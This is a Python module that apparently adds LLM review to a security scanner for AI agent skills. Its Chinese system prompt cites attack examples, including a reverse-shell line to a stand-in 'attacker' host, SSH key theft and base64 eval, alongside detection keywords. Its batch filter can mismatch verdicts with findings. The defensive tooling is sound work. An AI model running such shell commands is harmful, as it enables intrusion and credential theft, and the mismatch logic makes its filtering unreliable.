#!/usr/bin/env python3
"""
LLM 二次审查引擎 v4.0 — AI-Powered Finding Reviewer

设计理念：
- 规则引擎负责"宁可错杀不可放过"（高召回率）
- LLM 负责判断"这到底是不是真的威胁"（高精度）
- 两者结合 = 低误报 + 不漏报

工作流程：
1. 收集所有静态检测的发现
2. 按文件分组，附带完整上下文代码
3. 调用 LLM 逐条审查
4. 标记 True Positive / False Positive / Needs Human Review
"""

import json
import os
import re
import sys
from collections import defaultdict
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass


@dataclass
class ReviewResult:
    """单条发现的审查结果"""
    original_finding: Dict
    verdict: str                     # TP / FP / HUMAN_REVIEW
    confidence: float                # 0.0-1.0
    reasoning: str
    true_severity: Optional[str]
    summary: str                     # 一句话中文总结


# ─── LLM 审查 System Prompt ──────────────────────────────────
REVIEW_SYSTEM_PROMPT = """\
你是一位资深安全工程师，正在审查 AI Agent Skill 的安全扫描结果。

## 背景
AI Agent Skills 是扩展 AI 助手能力的插件。一个 skill 通常包含：
- SKILL.md（元数据 + 指令）
- Python/Shell/JS 脚本
- 配置文件（package.json, requirements.txt）
- 参考数据文件（JSON 格式的已知恶意技能列表等）

## 你的任务
对每条扫描发现做出判断：真实威胁 (TP)、误报 (FP)、还是需要人工审查 (HUMAN_REVIEW)。

## 常见误报模式（这些看起来可疑但实际上是无害的）

1. **安全工具自身的规则定义** — 安全扫描器在代码中定义检测模式如 `/dev/tcp/`、`xmrig`、`osascript password`，这是规则而非实际攻击代码。

2. **参考数据文件** — JSON 文件列出已知恶意技能名、IOC 域名、攻击模式。包含 "exfiltration"、"backdoor"、"reverse shell" 等关键词但只是数据。

3. **安全审计/修复脚本** — 检查弱 token、修复文件权限 (chmod 700)、验证配置的脚本。提到 "token"、"secret"、"credentials" 是因为它们在检查这些内容，而不是窃取。

4. **文档中的关键词** — README/SKILL.md 描述工具功能时提到的 "password"、"key"、"ssh" 是正常的。

5. **安全的安装钩子** — `postinstall: "agent-skill-installer install"` 使用合法的包安装器。

6. **Echo/print 语句** — Shell 脚本输出配置模板或状态消息，其中包含 "secret" 或 "token" 等词。

7. **目录安全检查** — `find ~/.openclaw -name ".env*"` 用于统计 .env 文件数量以评估风险，不是读取凭证内容。类似地 `ls -la ~/.ssh` 是检查目录是否存在和权限。

8. **审计报告中的描述文本** — Python dict 中的 `'risk': '...without credentials'` 是审计报告的描述文字，不是实际的风险操作。

## 真实威胁指标（这些才是真正的威胁）

1. **实际的网络外传** — 代码读取敏感文件 AND 发送到外部（curl POST、requests.post 到外部 URL）。

2. **真实的凭证窃取** — 读取 ~/.ssh/id_rsa 并上传、访问浏览器密码数据库。

3. **反向 Shell / C2** — 实际执行 `bash -i >& /dev/tcp/attacker/port`。

4. **社会工程** — 伪造密码对话框 (osascript)、钓鱼提示。

5. **持久化机制** — 添加 cron job、修改 .bashrc 来在登录时运行恶意代码。

6. **混淆** — Base64 编码的 payload、eval(base64_decode(...))、hex 编码字符串。

## 判断原则

- **保守原则**：不确定时用 HUMAN_REVIEW，不要用 FP。
- **上下文是关键**：同样的代码片段在不同上下文中含义完全不同。
- **安全工具自引用是 FP**：安全扫描器的规则定义、测试数据、参考列表都是误报。
- **可执行代码才是重点**：参考数据、文档、注释、echo 语句通常是误报。
- **审计/修复脚本是 FP**：检查安全配置、修复权限的脚本是良性操作。

## 输出格式
仅输出一个 JSON 对象：
{
    "verdict": "FP" | "TP" | "HUMAN_REVIEW",
    "confidence": 0.0-1.0,
    "true_severity": "CRITICAL" | "HIGH" | "MEDIUM" | "LOW" | null,
    "reasoning": "简要说明为什么这是/不是真正的威胁",
    "summary": "一句话中文总结"
}
"""

REVIEW_USER_TEMPLATE = """\
## 技能基本信息
- 名称: {skill_name}
- 作者: {author}
- 描述: {description}
- 类型: {skill_type}
- 文件数: {file_count}
- 主要语言: {languages}

## 扫描发现详情
- 规则 ID: {rule_id}
- 标题: {title}
- 原始严重度: {severity}
- 来源引擎: {source}
- 分类: {category}
- 文件路径: {file_path}
- 匹配行号: {line_number}
- 描述: {finding_description}

## 完整文件结构
```
{file_tree}
```

## 匹配代码及上下文（>>> 标记匹配行）
```
{code_context}
```

## 同文件中其他相关代码段
{related_code}

请判断：这是真实威胁 (TP)、误报 (FP)、还是需要人工审查 (HUMAN_REVIEW)？
仅输出 JSON 对象。
"""


class LLMReviewer:
    """
    LLM 二次审查引擎
    
    用法:
        reviewer = LLMReviewer()
        results = reviewer.review_findings(findings, target_path)
    """

    def __init__(self, model: Optional[str] = None):
        self.model = model or os.environ.get('SCANNER_REVIEW_MODEL', None)
        self._client = None

    def _get_provider_config(self) -> Dict[str, str]:
        """复用语义审计的 Provider 自动发现逻辑"""
        # 优先使用环境变量
        if os.environ.get('OPENAI_BASE_URL') and os.environ.get('OPENAI_API_KEY'):
            return {
                'url': os.environ['OPENAI_BASE_URL'],
                'key': os.environ['OPENAI_API_KEY'],
                'model': os.environ.get('OPENAI_MODEL', self.model or 'gpt-4o-mini'),
                'type': 'openai-chat',
            }
        
        # 从 openclaw.json 自动发现（与 semantic_auditor 相同逻辑）
        try:
            config_path = Path.home() / '.openclaw' / 'openclaw.json'
            if not config_path.exists():
                raise FileNotFoundError("openclaw.json not found")
            
            with open(config_path, 'r', encoding='utf-8') as f:
                cfg = json.load(f)
            
            providers = cfg.get('models', {}).get('providers', {})
            for prov_id, prov_cfg in providers.items():
                api_key = prov_cfg.get('apiKey')
                base_url = prov_cfg.get('baseUrl')
                models_list = prov_cfg.get('models', [])
                
                if api_key and base_url and models_list:
                    model_id = self.model or models_list[0].get('id', '')
                    
                    # 探测正确的 API 类型和 URL
                    detected = self._probe_api(base_url, api_key, model_id)
                    if detected:
                        return detected
                    
                    # Fallback
                    return {
                        'url': base_url,
                        'key': api_key,
                        'model': model_id,
                        'type': 'openai-chat',
                    }
        except Exception as e:
            print(f"⚠️  Provider 自动发现失败: {e}", file=sys.stderr)
        
        raise RuntimeError("无法找到 LLM Provider 配置。请设置 OPENAI_BASE_URL 和 OPENAI_API_KEY 环境变量，或确保 openclaw.json 配置正确。")

    def _probe_api(self, base_url: str, api_key: str, model_id: str) -> Optional[Dict]:
        """探测可用的 API 端点"""
        import urllib.request
        import urllib.error
        
        base = base_url.rstrip('/')
        candidates = []
        
        if '/api/' in base:
            root = base[:base.index('/api/')]
            candidates.append(f'{root}/v1/chat/completions')
        
        if not base.endswith('/v1/chat/completions'):
            candidates.append(f'{base}/v1/chat/completions')
        candidates.append(base)
        
        seen = set()
        unique = []
        for c in candidates:
            if c not in seen:
                seen.add(c)
                unique.append(c)
        
        for url in unique:
            try:
                payload = json.dumps({
                    "model": model_id,
                    "messages": [{"role": "user", "content": "OK"}],
                    "max_tokens": 5,
                }).encode()
                
                req = urllib.request.Request(
                    url,
                    data=payload,
                    headers={
                        'Content-Type': 'application/json',
                        'Authorization': f'Bearer {api_key}',
                    },
                    method='POST',
                )
                
                with urllib.request.urlopen(req, timeout=10) as resp:
                    if resp.status == 200:
                        return {
                            'url': url,
                            'key': api_key,
                            'model': model_id,
                            'type': 'openai-chat',
                        }
            except Exception:
                continue
        
        return None

    def _call_llm(self, user_prompt: str) -> Dict:
        """调用 LLM 进行单条审查"""
        provider = self._get_provider_config()
        
        import urllib.request
        import urllib.error
        
        payload_data = {
            "model": provider['model'],
            "messages": [
                {"role": "system", "content": REVIEW_SYSTEM_PROMPT + "\n\n⚠️ IMPORTANT: Your response must be ONLY a valid JSON object. Do NOT include any thinking process, explanation, or text before/after the JSON. Start your response with { and end with }."},
                {"role": "user", "content": user_prompt},
            ],
            "temperature": 0.1,
            "max_tokens": 4000,
        }
        
        payload = json.dumps(payload_data).encode()
        
        req = urllib.request.Request(
            provider['url'],
            data=payload,
            headers={
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {provider["key"]}',
            },
            method='POST',
        )
        
        try:
            with urllib.request.urlopen(req, timeout=60) as resp:
                content = resp.read().decode('utf-8')
                result = json.loads(content)
                
                # 提取响应文本
                if 'choices' in result and result['choices']:
                    message = result['choices'][0].get('message', {})
                    # Qwen 系列模型可能把内容放在 reasoning_content
                    text = message.get('content', '') or message.get('reasoning_content', '')
                    if not text:
                        raise ValueError(f"Empty response from LLM. Full message: {str(message)[:300]}")
                    return self._parse_llm_response(text)
                else:
                    raise ValueError(f"Unexpected API response: {str(result)[:200]}")
        except Exception as e:
            raise RuntimeError(f"LLM API 调用失败: {e}")

    def _build_file_tree(self, target: Path) -> str:
        """构建技能目录的文件树"""
        if not target.is_dir():
            return f"(single file: {target.name})"
        
        lines = []
        for fp in sorted(target.rglob('*')):
            if not fp.is_file():
                continue
            rel = fp.relative_to(target)
            depth = len(rel.parts) - 1
            indent = '  ' * depth
            size = fp.stat().st_size
            lines.append(f"{indent}├── {rel.name} ({size}B)")
        
        return '\n'.join(lines[:50]) + ('\n  ...' if len(lines) > 50 else '')

    def _get_code_context(self, file_path: str, line_number: int, 
                           context_lines: int = 15) -> str:
        """获取匹配行及周围代码上下文"""
        try:
            path = Path(file_path)
            if not path.exists():
                return "(file not found)"
            
            lines = path.read_text(encoding='utf-8', errors='ignore').split('\n')
            start = max(0, line_number - context_lines - 1)
            end = min(len(lines), line_number + context_lines)
            
            context = []
            for i in range(start, end):
                marker = '>>> ' if i == line_number - 1 else '    '
                context.append(f"{marker}{i+1:4d}: {lines[i]}")
            
            return '\n'.join(context)
        except Exception as e:
            return f"(error reading context: {e})"

    def _extract_skill_info(self, target: Path) -> Dict:
        """提取技能基本信息"""
        info = {
            'name': target.name, 
            'author': '', 
            'description': '',
            'type': 'unknown',
            'file_count': 0,
            'languages': [],
        }
        
        content = ''
        if target.is_file():
            content = target.read_text(encoding='utf-8', errors='ignore')
        elif (target / 'SKILL.md').exists():
            content = (target / 'SKILL.md').read_text(encoding='utf-8', errors='ignore')
        
        if content:
            for pattern in [r'Author:\s*(.+)', r'作者[:：]\s*(.+)', r'github\.com/([^/]+)/']:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    info['author'] = match.group(1).strip().rstrip('.')
                    break
            
            desc_match = re.search(r'^>\s*(.+)$', content, re.MULTILINE)
            if desc_match:
                info['description'] = desc_match.group(1).strip()
        
        if target.is_dir():
            files = list(target.rglob('*'))
            info['file_count'] = sum(1 for f in files if f.is_file())
            
            exts = set()
            for f in files:
                if f.is_file() and f.suffix:
                    exts.add(f.suffix)
            
            lang_map = {'.py': 'Python', '.sh': 'Shell', '.js': 'JavaScript', 
                       '.ts': 'TypeScript', '.md': 'Markdown', '.json': 'JSON'}
            info['languages'] = [lang_map.get(e, e) for e in sorted(exts) if e in lang_map]
            
            # 判断技能类型
            if any(f.name == 'SKILL.md' for f in files):
                info['type'] = 'OpenClaw Skill'
            elif any(f.name == 'package.json' for f in files):
                info['type'] = 'Node.js Package'
        
        return info

    def _get_related_code(self, file_path: str, line_number: int) -> str:
        """提取同文件中与发现相关的其他代码段"""
        try:
            path = Path(file_path)
            if not path.exists():
                return "(none)"
            
            content = path.read_text(encoding='utf-8', errors='ignore')
            lines = content.split('\n')
            
            related = []
            
            # 如果是 shell 脚本，查找函数定义和主流程
            if file_path.endswith('.sh'):
                func_defs = []
                main_flow = []
                for i, line in enumerate(lines):
                    stripped = line.strip()
                    if re.match(r'^[a-zA-Z_]+\s*\(\)\s*\{', stripped):
                        func_defs.append(f"Line {i+1}: {stripped}")
                    elif stripped.startswith('echo "') or stripped.startswith('print_row'):
                        main_flow.append(f"Line {i+1}: {stripped[:100]}")
                
                if func_defs:
                    related.append("函数定义:\n" + "\n".join(func_defs[:5]))
                if main_flow:
                    related.append("主要输出:\n" + "\n".join(main_flow[:5]))
            
            # 如果是 Python 脚本，查找函数和类定义
            elif file_path.endswith('.py'):
                for i, line in enumerate(lines):
                    stripped = line.strip()
                    if stripped.startswith('def ') or stripped.startswith('class '):
                        related.append(f"Line {i+1}: {stripped[:100]}")
            
            return "\n\n".join(related[:3]) if related else "(no additional context)"
            
        except Exception:
            return "(error extracting related code)"

    def review_findings_batch(self, findings: List[Dict], target_path: str,
                               threshold: str = "MEDIUM") -> List[ReviewResult]:
        """
        批量审查 — 按文件分组，减少 LLM 调用次数

        Args:
            findings: 发现列表
            target_path: 扫描目标路径
            threshold: 审查阈值 ("ALL" | "MEDIUM" | "HIGH")
        """
        if not findings:
            return []

        target = Path(target_path)
        skill_info = self._extract_skill_info(target)
        file_tree = self._build_file_tree(target)

        severity_order = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}
        threshold_min = {"ALL": 0, "MEDIUM": 2, "HIGH": 3}.get(threshold, 2)

        eligible = [f for f in findings
                    if severity_order.get(f.get("severity", "LOW"), 0) >= threshold_min]

        groups = defaultdict(list)
        for finding in eligible:
            key = finding.get("file_path", "unknown")
            groups[key].append(finding)

        results = []
        for file_path, group_findings in groups.items():
            group_results = self._review_group(group_findings, skill_info, file_tree, target)
            results.extend(group_results)

        skipped = [f for f in findings
                   if severity_order.get(f.get("severity", "LOW"), 0) < threshold_min]
        for f in skipped:
            results.append(ReviewResult(
                original_finding=f,
                verdict="UNCERTAIN",
                confidence=0.3,
                reasoning=f"低于审查阈值 ({threshold})，跳过 LLM 审查",
                true_severity=None,
                summary="低风险发现，建议人工确认",
            ))

        return results

    def _review_group(self, findings: List[Dict], skill_info: Dict,
                      file_tree: str, target: Path) -> List[ReviewResult]:
        """对同一文件的多个发现进行一次性 LLM 审查"""
        if len(findings) == 1:
            return [self._review_single(findings[0], skill_info, file_tree, target)]

        file_path = findings[0].get("file_path", "")
        line_num = findings[0].get("line_number", 0)
        code_context = self._get_code_context(file_path, line_num, context_lines=20)

        findings_list = "\n\n".join([
            f"### 发现 #{i+1}\n"
            f"- 规则 ID: {f.get('rule_id', 'N/A')}\n"
            f"- 标题: {f.get('title', '')}\n"
            f"- 原始严重度: {f.get('severity', 'MEDIUM')}\n"
            f"- 来源引擎: {f.get('source', 'unknown')}\n"
            f"- 描述: {f.get('description', '')[:300]}"
            for i, f in enumerate(findings)
        ])

        user_prompt = (
            f"## 技能基本信息\n"
            f"- 名称: {skill_info.get('name', 'unknown')}\n"
            f"- 作者: {skill_info.get('author', 'unknown')}\n"
            f"- 类型: {skill_info.get('type', 'unknown')}\n"
            f"- 文件数: {skill_info.get('file_count', 0)}\n\n"
            f"## 待审查文件\n{file_path}\n\n"
            f"## 文件代码上下文\n```\n{code_context}\n```\n\n"
            f"## 该文件的所有发现 ({len(findings)} 条)\n\n"
            f"{findings_list}\n\n"
            f"## 任务\n"
            f"请逐条判断这些发现是：真实威胁 (TP)、误报 (FP)、还是需要人工审查 (HUMAN_REVIEW)。\n"
            f"请输出一个 JSON 数组，每条发现对应一个对象，格式如下：\n"
            f"[\n"
            f"  {{\n"
            f"    \"finding_index\": 0,\n"
            f"    \"verdict\": \"TP|FP|HUMAN_REVIEW\",\n"
            f"    \"confidence\": 0.0-1.0,\n"
            f"    \"true_severity\": \"CRITICAL|HIGH|MEDIUM|LOW|null\",\n"
            f"    \"reasoning\": \"简要说明\",\n"
            f"    \"summary\": \"一句话中文总结\"\n"
            f"  }}\n"
            f"]"
        )

        try:
            provider = self._get_provider_config()
            import urllib.request

            payload_data = {
                "model": provider['model'],
                "messages": [
                    {"role": "system", "content": REVIEW_SYSTEM_PROMPT + "\n\n⚠️ IMPORTANT: Your response must be ONLY a valid JSON array. Do NOT include any thinking process. Start with [ and end with ]."},
                    {"role": "user", "content": user_prompt},
                ],
                "temperature": 0.1,
                "max_tokens": 4000,
            }

            payload = json.dumps(payload_data).encode()
            req = urllib.request.Request(
                provider['url'],
                data=payload,
                headers={
                    'Content-Type': 'application/json',
                    'Authorization': f'Bearer {provider["key"]}',
                },
                method='POST',
            )

            with urllib.request.urlopen(req, timeout=120) as resp:
                content = resp.read().decode('utf-8')
                result = json.loads(content)

                if 'choices' in result and result['choices']:
                    message = result['choices'][0].get('message', {})
                    text = message.get('content', '') or message.get('reasoning_content', '')
                    if not text:
                        raise ValueError("Empty response from LLM")
                    return self._parse_batch_response(text, findings)
                else:
                    raise ValueError(f"Unexpected API response: {str(result)[:200]}")

        except Exception as e:
            # Fallback: review each finding individually
            results = []
            for f in findings:
                result = self._review_single(f, skill_info, file_tree, target)
                results.append(result)
            return results

    def _parse_batch_response(self, content: str, original_findings: List[Dict]) -> List[ReviewResult]:
        """解析批量审查的 LLM 响应"""
        try:
            results = json.loads(content)
            if not isinstance(results, list):
                raise ValueError("Expected JSON array")

            review_results = []
            for i, result in enumerate(results):
                if i < len(original_findings):
                    review_results.append(ReviewResult(
                        original_finding=original_findings[i],
                        verdict=result.get('verdict', 'HUMAN_REVIEW'),
                        confidence=result.get('confidence', 0.5),
                        reasoning=result.get('reasoning', ''),
                        true_severity=result.get('true_severity'),
                        summary=result.get('summary', ''),
                    ))

            # Pad with UNCERTAIN for any missing results
            while len(review_results) < len(original_findings):
                idx = len(review_results)
                review_results.append(ReviewResult(
                    original_finding=original_findings[idx],
                    verdict='UNCERTAIN',
                    confidence=0.5,
                    reasoning='LLM 未返回该条目的审查结果',
                    true_severity=None,
                    summary='未获得 LLM 审查结果',
                ))

            return review_results

        except json.JSONDecodeError:
            # Try to extract JSON from markdown code block
            match = re.search(r'```(?:json)?\s*\n(.*?)\n```', content, re.DOTALL)
            if match:
                return self._parse_batch_response(match.group(1), original_findings)
            raise ValueError(f"Failed to parse batch response: {content[:200]}")

    def filter_findings_batch(self, findings: List[Dict], target_path: str,
                              threshold: str = "MEDIUM", keep_fp: bool = False) -> Tuple[List[Dict], List[ReviewResult]]:
        """
        批量过滤发现 — 按文件分组审查

        Args:
            findings: 原始发现列表
            target_path: 扫描目标路径
            threshold: 审查阈值 ("ALL" | "MEDIUM" | "HIGH")
            keep_fp: 是否保留误报（用于调试/报告）

        Returns:
            (filtered_findings, all_review_results)
        """
        reviews = self.review_findings_batch(findings, target_path, threshold=threshold)

        filtered = []
        for finding, review in zip(findings, reviews):
            if review.verdict == 'FP' and review.confidence > 0.8 and not keep_fp:
                continue
            elif review.verdict == 'TP':
                enhanced = dict(finding)
                if review.true_severity:
                    enhanced['severity'] = review.true_severity
                enhanced['llm_review'] = {
                    'verdict': review.verdict,
                    'confidence': review.confidence,
                    'reasoning': review.reasoning,
                    'summary': review.summary,
                }
                filtered.append(enhanced)
            else:
                enhanced = dict(finding)
                enhanced['llm_review'] = {
                    'verdict': review.verdict,
                    'confidence': review.confidence,
                    'reasoning': review.reasoning,
                    'summary': review.summary,
                }
                filtered.append(enhanced)

        return filtered, reviews

    def review_findings(self, findings: List[Dict], target_path: str) -> List[ReviewResult]:
        """
        对所有发现进行 LLM 二次审查（逐条精细审查）

        Args:
            findings: 扫描器产生的所有发现列表
            target_path: 扫描目标路径

        Returns:
            审查结果列表
        """
        if not findings:
            return []

        target = Path(target_path)
        skill_info = self._extract_skill_info(target)
        file_tree = self._build_file_tree(target)

        results = []
        for finding in findings:
            result = self._review_single(finding, skill_info, file_tree, target)
            results.append(result)

        return results

    def _review_single(self, finding: Dict, skill_info: Dict,
                        file_tree: str, target: Path) -> ReviewResult:
        """审查单条发现"""
        file_path = finding.get('file_path', '')
        line_num = finding.get('line_number', 0)
        code_context = self._get_code_context(file_path, line_num)
        related_code = self._get_related_code(file_path, line_num)
        
        user_prompt = REVIEW_USER_TEMPLATE.format(
            skill_name=skill_info.get('name', 'unknown'),
            author=skill_info.get('author', 'unknown'),
            description=skill_info.get('description', ''),
            skill_type=skill_info.get('type', 'unknown'),
            file_count=skill_info.get('file_count', 0),
            languages=', '.join(skill_info.get('languages', [])),
            file_tree=file_tree,
            rule_id=finding.get('rule_id', 'N/A'),
            title=finding.get('title', ''),
            severity=finding.get('severity', 'MEDIUM'),
            source=finding.get('source', 'unknown'),
            category=finding.get('category', 'unknown'),
            file_path=file_path,
            line_number=line_num,
            code_context=code_context,
            finding_description=finding.get('description', ''),
            related_code=related_code,
        )
        
        try:
            verdict_data = self._call_llm(user_prompt)
            return ReviewResult(
                original_finding=finding,
                verdict=verdict_data.get('verdict', 'HUMAN_REVIEW'),
                confidence=verdict_data.get('confidence', 0.5),
                reasoning=verdict_data.get('reasoning', ''),
                true_severity=verdict_data.get('true_severity'),
                summary=verdict_data.get('summary', ''),
            )
        except Exception as e:
            import traceback
            tb = traceback.format_exc()
            print(f"⚠️  LLM review error for {finding.get('rule_id', '?')}: {e}", file=sys.stderr)
            print(tb[:500], file=sys.stderr)
            return ReviewResult(
                original_finding=finding,
                verdict='HUMAN_REVIEW',
                confidence=0.0,
                reasoning=f'LLM review failed: {str(e)[:200]}',
                true_severity=None,
                summary=f'LLM 审查失败: {str(e)[:50]}',
            )

    def _parse_llm_response(self, content: str) -> Dict:
        """解析 LLM 返回的 JSON 响应"""
        if not content or not content.strip():
            raise ValueError("Empty LLM response")
        
        try:
            return json.loads(content)
        except json.JSONDecodeError:
            # Try to extract JSON from markdown code block
            match = re.search(r'```(?:json)?\s*\n(.*?)\n```', content, re.DOTALL)
            if match:
                return json.loads(match.group(1))
            
            # Try to find any JSON object in the text
            match = re.search(r'\{[^{}]*"verdict"[^{}]*\}', content, re.DOTALL)
            if match:
                return json.loads(match.group(0))
            
            raise ValueError(f"Failed to parse LLM response: {content[:200]}")

    def filter_findings(self, findings: List[Dict], target_path: str,
                         keep_fp: bool = False) -> Tuple[List[Dict], List[ReviewResult]]:
        """
        过滤发现 — 移除确认为误报的项
        
        Args:
            findings: 原始发现列表
            target_path: 扫描目标路径
            keep_fp: 是否保留误报（用于调试/报告）
            
        Returns:
            (filtered_findings, all_review_results)
        """
        reviews = self.review_findings(findings, target_path)
        
        filtered = []
        for finding, review in zip(findings, reviews):
            if review.verdict == 'FP' and review.confidence > 0.8 and not keep_fp:
                continue
            elif review.verdict == 'TP':
                enhanced = dict(finding)
                if review.true_severity:
                    enhanced['severity'] = review.true_severity
                enhanced['llm_review'] = {
                    'verdict': review.verdict,
                    'confidence': review.confidence,
                    'reasoning': review.reasoning,
                    'summary': review.summary,
                }
                filtered.append(enhanced)
            else:
                enhanced = dict(finding)
                enhanced['llm_review'] = {
                    'verdict': review.verdict,
                    'confidence': review.confidence,
                    'reasoning': review.reasoning,
                    'summary': review.summary,
                }
                filtered.append(enhanced)
        
        return filtered, reviews

    def get_review_summary(self, reviews: List[ReviewResult]) -> Dict:
        """生成审查统计摘要"""
        by_verdict = {'TP': 0, 'FP': 0, 'HUMAN_REVIEW': 0}
        high_confidence_fp = 0
        high_confidence_tp = 0
        
        for r in reviews:
            by_verdict[r.verdict] = by_verdict.get(r.verdict, 0) + 1
            if r.confidence > 0.8:
                if r.verdict == 'FP':
                    high_confidence_fp += 1
                elif r.verdict == 'TP':
                    high_confidence_tp += 1
        
        return {
            'total_reviewed': len(reviews),
            'by_verdict': by_verdict,
            'high_confidence_fp': high_confidence_fp,
            'high_confidence_tp': high_confidence_tp,
            'false_positive_rate': round(high_confidence_fp / max(len(reviews), 1) * 100, 1),
        }


__all__ = ['LLMReviewer', 'ReviewResult']